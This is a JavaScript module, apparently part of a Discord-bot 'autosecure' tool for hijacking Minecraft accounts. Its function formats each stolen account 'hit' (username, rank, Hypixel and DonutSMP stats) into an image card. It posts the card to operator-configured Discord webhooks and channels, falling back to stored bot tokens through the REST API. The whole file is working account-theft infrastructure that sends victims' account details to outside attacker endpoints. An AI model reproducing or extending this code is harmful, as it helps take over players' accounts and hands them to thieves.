const { AttachmentBuilder, WebhookClient } = require('discord.js');
const { makeCard } = require('../drawhit');
const config = require('../../../config.json');
const path = require('path');
const fs = require('fs');
const { startFolderMonitor } = require('../autocleaner');
const { getMainBotClient } = require('../../../mainbot/handlers/botHandler');

const { queryParams } = require('../../../db/database');

function isValidMinecraftUsername(name) {
    if (!name || typeof name !== 'string') return false;
    const invalidKeywords = ["couldn't find!", "couldn't change!", "no minecraft!", "xbl failed", "none", "unknown", "failed"];
    if (invalidKeywords.includes(name.trim().toLowerCase())) return false;
    return /^[a-zA-Z0-9_]{2,16}$/.test(name.trim());
}

const recentNotifications = new Set();

async function sendSecureNotification(client, accountData, targetChannelId = null) {
    try {
        if (!accountData?.username || !isValidMinecraftUsername(accountData.username)) {
            console.log(`[NOTIFIER] Skipping notification for invalid/placeholder username: '${accountData?.username}'`);
            return;
        }

        const notifKey = `${accountData.username.toLowerCase()}_${Math.floor(Date.now() / 15000)}`;
        if (recentNotifications.has(notifKey)) {
            console.log(`[NOTIFIER] Skipping duplicate notification for ${accountData.username}`);
            return;
        }
        recentNotifications.add(notifKey);
        setTimeout(() => recentNotifications.delete(notifKey), 30000);

        let channelId = targetChannelId;
        let customWebhook = null;
        let botToken = null;

        let notificationChannelId = null;

        if (client?.username) {
            try {
                const dbResults = await queryParams('SELECT hits_channel, notification_channel, webhook, token FROM autosecure WHERE user_id = ? AND botnumber = ? LIMIT 1', [client.username, client.botnumber || 1]);
                if (dbResults && dbResults[0]?.hits_channel) {
                    channelId = dbResults[0].hits_channel.split('|')[0];
                }
                if (dbResults && dbResults[0]?.notification_channel) {
                    notificationChannelId = dbResults[0].notification_channel.split('|')[0];
                }
                if (dbResults && dbResults[0]?.webhook) {
                    customWebhook = dbResults[0].webhook;
                }
                if (dbResults && dbResults[0]?.token) {
                    botToken = dbResults[0].token;
                }
            } catch (e) {
                console.error('[NOTIFIER] Error checking DB for hits_channel & webhook:', e.message);
            }
        }
        if (!channelId) {
            channelId = config.notifierChannel || config.hitschannel || null;
        }

        const webhookUrls = new Set();
        if (customWebhook && customWebhook.trim() !== '') webhookUrls.add(customWebhook.trim());
        if (config.notifierWebhook && config.notifierWebhook.trim() !== '') webhookUrls.add(config.notifierWebhook.trim());

        if (webhookUrls.size === 0 && !channelId) {
            console.log('[NOTIFIER] No notifierWebhook, custom user webhook, or hitschannel configured, skipping image notification.');
            return;
        }

        const stats = {
            username: accountData.username || 'Unknown',
            rank: accountData.rank || 'NONE',
            networth: accountData.networth || '0',
            bedwars: accountData.bedwars || accountData.bedwarsLevel || '0',
            networkLevel: accountData.networkLevel || '0',
            sbLevel: accountData.sbLevel || '0',
            duelKDR: accountData.duelKDR || '0',
            duelWinstreak: accountData.duelWinstreak || '0',
            plusColour: accountData.plusColour || 'None',
            gifted: accountData.gifted || '0',
            donut: accountData.donut || null,
            donutMoney: accountData.donutMoney || accountData.donut?.moneyFormatted || accountData.donut?.money || null,
            donutShards: accountData.donutShards || accountData.donut?.shardsFormatted || accountData.donut?.shards || null,
            donutPlaytime: accountData.donutPlaytime || accountData.donut?.playtime || null,
            donutRank: accountData.donutRank || accountData.donut?.rank || null,
            donutKDR: accountData.donutKDR || accountData.donut?.kdr || null
        };

        const timestamp = Date.now();
        const filename = `secure_${accountData.username}_${timestamp}.png`;
        const tempDir = path.join(__dirname, 'temp');

        if (!fs.existsSync(tempDir)) {
            fs.mkdirSync(tempDir, { recursive: true });
            startFolderMonitor(tempDir, 5);
        }

        let imageBuffer = null;
        let attachment = null;
        const isChildBot = client && client.botnumber && client.botnumber > 1;

        if (!isChildBot) {
            const outputPath = path.join(tempDir, filename);
            imageBuffer = await makeCard(stats, outputPath);
            attachment = new AttachmentBuilder(imageBuffer, { name: filename });
        } else {
            console.log(`[NOTIFIER] Skipping draw hit for child bot (botnumber: ${client.botnumber})`);
        }

        // 1. Send via Webhooks if configured
        if (webhookUrls.size > 0) {

            for (const whUrl of webhookUrls) {
                try {
                    const webhook = new WebhookClient({ url: whUrl });
                    const payload = {};
                    if (attachment) payload.files = [attachment];
                    else payload.content = `[Hit] **${stats.username}** secured! (Image disabled for child bot)`;
                    
                    await webhook.send(payload);
                    console.log(`[NOTIFIER] Successfully sent hit image to webhook (${whUrl.substring(0, 45)}...) for ${stats.username}`);
                } catch (whErr) {
                    console.error('[NOTIFIER] Error sending hit to webhook:', whErr.message);
                }
            }
        }

        // 2. Send to Discord Channel strictly using the MAIN BOT client
        const channelsToSend = [];
        if (channelId) channelsToSend.push(channelId);
        if (notificationChannelId && notificationChannelId !== channelId) channelsToSend.push(notificationChannelId);

        for (const cid of channelsToSend) {
            try {
                const mainBotClient = getMainBotClient();
                let channel = null;
                let senderTag = 'Unknown';

                // Try all available clients to find the channel
                const clients = [
                    mainBotClient,
                    client
                ].filter(c => c && c.isReady && c.isReady() && c.channels);

                for (const c of clients) {
                    channel = await c.channels.fetch(cid).catch(() => null);
                    if (channel) {
                        senderTag = c.user?.tag || 'Bot';
                        break;
                    }
                }

                if (channel) {
                    const payload = {};
                    if (attachment) payload.files = [attachment];
                    else payload.content = `[Hit] **${stats.username}** secured! (Image disabled for child bot)`;

                    await channel.send(payload);
                    console.log(`[NOTIFIER] Successfully sent hit image via ${senderTag} to channel <#${cid}> for ${stats.username}`);
                } else if (botToken || (config.tokens && config.tokens[0])) {
                    const { REST, Routes } = require('discord.js');
                    const rest = new REST({ version: '10' }).setToken(botToken || config.tokens[0]);
                    const payload = {};
                    if (imageBuffer) {
                        payload.files = [{ name: filename, data: imageBuffer }];
                    } else {
                        payload.content = `[Hit] **${stats.username}** secured! (Image disabled for child bot)`;
                    }
                    await rest.post(Routes.channelMessages(cid), payload);
                    console.log(`[NOTIFIER] Successfully sent hit image via REST API to channel <#${cid}> for ${stats.username}`);
                } else {
                    console.error(`[NOTIFIER] Channel <#${cid}> not found on any bot client`);
                }
            } catch (chErr) {
                console.error(`[NOTIFIER] Error sending hit image to channel ${cid}:`, chErr.message);
            }
        }

    } catch (error) {
        console.error('[NOTIFIER] Failed to send secure notification:', error);
    }
}

module.exports = { sendSecureNotification };
